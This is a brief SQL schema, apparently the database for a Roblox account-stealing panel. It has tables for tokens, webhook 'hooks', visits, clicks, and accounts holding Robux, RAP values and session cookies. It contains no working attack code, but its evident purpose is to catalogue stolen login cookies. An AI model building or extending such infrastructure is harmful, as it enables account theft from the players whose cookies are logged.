CREATE TABLE Tokens (
    id INT AUTO_INCREMENT PRIMARY KEY,
    token TEXT,
    name TEXT,
    username TEXT,
    user_icon TEXT,
    directory TEXT,
    webhook TEXT,
    is_hooked TEXT,
    hook_id TEXT
);

CREATE TABLE Hooks (
    id INT,
    name TEXT,
    directory TEXT,
    icon TEXT,
    color TEXT,
    webhook TEXT,
    is_quad TEXT,
    is_triple TEXT
);

CREATE TABLE Visits (
    id INT,
    `for` TEXT,
    date TEXT
);

CREATE TABLE Clicks (
    id INT,
    `for` TEXT,
    date TEXT
);

CREATE TABLE Accounts (
    id INT,
    `for` TEXT,
    date TEXT,
    rap INT,
    robux INT,
    summary INT,
    cookie TEXT
);
